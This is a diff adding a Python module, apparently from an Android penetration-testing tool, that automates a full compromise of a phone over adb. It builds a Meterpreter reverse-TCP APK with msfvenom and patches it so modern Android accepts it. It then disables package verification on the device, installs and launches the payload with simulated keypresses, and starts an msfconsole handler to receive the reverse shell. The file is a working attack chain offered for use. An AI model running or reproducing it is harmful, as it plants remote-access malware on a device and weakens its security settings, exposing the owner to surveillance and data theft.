@@ -1,0 +1,181 @@
+import subprocess
+import time
+from pathlib import Path
+
+from modules.config import AppConfig
+from modules import banner
+from modules.console import console, confirm, adb, task_status, get_adb_executable, ask
+from modules.connection import get_ip_address, is_valid_ipv4
+
+
+def _modernize_apk(
+    apk_in: Path,
+    apk_out: Path,
+    lhost: str,
+    lport: str,
+    fgs: bool = False,
+) -> tuple[bool, str]:
+    """Patch an msfvenom Android payload (targetSdk 17) so modern Android
+    (11+/14/15) accepts the install.
+
+    Reuses build_payload.sh (apktool decode -> minSdk 21/targetSdk 34 +
+    android:exported -> rebuild -> resources STORED -> zipalign -> apksigner).
+    The script is told to use the already-generated payload via PAYLOAD_SRC
+    instead of regenerating from scratch. Returns (ok, detail).
+    """
+    import os
+
+    root = Path(__file__).resolve().parent.parent
+    script = root / "build_payload.sh"
+    if not script.is_file():
+        return False, "build_payload.sh not found in repo root"
+    cmd = ["bash", str(script)]
+    if fgs:
+        cmd.append("--fgs")
+    cmd += [lhost, lport, str(apk_out)]
+    env = {**os.environ, "PAYLOAD_SRC": str(apk_in)}
+    r = subprocess.run(cmd, capture_output=True, text=True, env=env)
+    if r.returncode != 0:
+        detail = (r.stderr or r.stdout).strip()
+        return False, detail[-400:] if detail else "build_payload.sh failed"
+    return True, "patched+signed"
+
+
+
+def hack(config: AppConfig) -> None:
+    import os
+
+    os.system(config.clear_cmd)
+    console.print(banner.instructions_banner)
+    console.print(banner.instruction)
+    choice = ask("[prompt]> [/prompt]")
+
+    if choice != "":
+        console.print("[green]Returning to Main Menu.[/green]")
+        return
+
+    os.system(config.clear_cmd)
+    ip = get_ip_address()
+    if ip is None:
+        console.print(
+            "[yellow]Could not auto-detect LAN IP. Using [bold]127.0.0.1[/bold] — press [bold]M[/bold] to set LHOST.[/yellow]"
+        )
+        ip = "127.0.0.1"
+    lport = "4444"
+    console.print(
+        f"[cyan]LHOST[/cyan] [white]{ip}[/white]  [cyan]LPORT[/cyan] [white]{lport}[/white]"
+    )
+
+    modify = ask(
+        "[yellow]Enter = continue · M = edit LHOST/LPORT[/yellow]> "
+    ).lower()
+
+    while modify not in ("m", ""):
+        modify = ask("[red]Enter or M[/red]> ").lower()
+
+    if modify == "m":
+        ip = ask("[cyan]LHOST[/cyan]> ").strip()
+        lport_in = ask("[cyan]LPORT[/cyan]> ").strip()
+        if not is_valid_ipv4(ip):
+            console.print("[red]Invalid LHOST → 127.0.0.1[/red]")
+            ip = "127.0.0.1"
+        if lport_in.isdigit() and 1 <= int(lport_in) <= 65535:
+            lport = lport_in
+        else:
+            console.print("[yellow]Invalid LPORT → 4444[/yellow]")
+
+    if not confirm(
+        "[bold red]WARNING:[/bold red] Payload install, security settings changes, Metasploit. "
+        "Authorized testing only. Continue?"
+    ):
+        console.print("[green]Cancelled.[/green]")
+        return
+
+    console.print(banner.hacking_banner)
+
+    apk_out = Path("test.apk")
+    msfvenom = config.msfvenom_path or "msfvenom"
+    msfconsole = config.msfconsole_path or "msfconsole"
+
+    with task_status("[info]msfvenom: building APK…[/info]"):
+        result = subprocess.run(
+            [
+                msfvenom,
+                "-p",
+                "android/meterpreter/reverse_tcp",
+                f"LHOST={ip}",
+                f"LPORT={lport}",
+                "-o",
+                str(apk_out),
+            ],
+            capture_output=True,
+            text=True,
+        )
+    if result.returncode != 0:
+        console.print(f"[red]msfvenom failed:[/red] {result.stderr or result.stdout}")
+        return
+    if not apk_out.is_file():
+        console.print("[red]test.apk missing[/red]")
+        return
+
+    # Modern Android (11+/14/15) refuses stock msfvenom payloads (targetSdk 17).
+    # Patch it the same way as build_payload.sh: targetSdk 34, exported,
+    # zipaligned + signed.
+    console.print(
+        "[yellow]Patching payload for modern Android (targetSdk 34)…[/yellow]"
+    )
+    patched_path = Path("test-sdk34.apk")
+    fgs = False
+    fgs_choice = ask(
+        "[yellow]Foreground-service mode (battery-killer safe)? [dim][Enter=no, F=yes][/dim]> "
+    ).lower()
+    if fgs_choice == "f":
+        fgs = True
+    ok, detail = _modernize_apk(apk_out, patched_path, ip, lport, fgs=fgs)
+    if not ok:
+        console.print(f"[red]Payload patch failed:[/red] {detail}")
+        console.print("[yellow]Falling back to raw msfvenom APK…[/yellow]")
+        patched_path = apk_out
+    else:
+        console.print(f"[green]Patched payload ready: {patched_path}[/green]")
+
+    with task_status("[info]Preparing device (home, verify settings)…[/info]"):
+        adb(["shell", "input", "keyevent", "3"])
+        adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
+        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])
+
+    adb_exe = get_adb_executable()
+    with task_status("[info]adb install payload…[/info]"):
+        install = subprocess.run(
+            [adb_exe or "adb", "install", "-r", str(patched_path)],
+            capture_output=True,
+            text=True,
+        )
+    if install.returncode != 0:
+        detail = (install.stdout + install.stderr).strip() or f"exit code {install.returncode}"
+        console.print(f"[red]adb install failed:[/red] {detail}")
+        with task_status("[info]Restoring app verification…[/info]"):
+            adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
+            adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
+        return
+
+    with task_status("[info]Launching payload…[/info]"):
+        adb(["shell", "monkey", "-p", "com.metasploit.stage", "1"])
+        time.sleep(3)
+        adb(["shell", "input", "keyevent", "22"])
+        adb(["shell", "input", "keyevent", "22"])
+        adb(["shell", "input", "keyevent", "66"])
+
+    console.print("[red]Starting msfconsole handler…[/red]")
+    subprocess.run(
+        [
+            msfconsole,
+            "-x",
+            f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
+            f"set LHOST {ip} ; set LPORT {lport} ; exploit",
+        ]
+    )
+
+    with task_status("[info]Restoring app verification…[/info]"):
+        adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
+        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
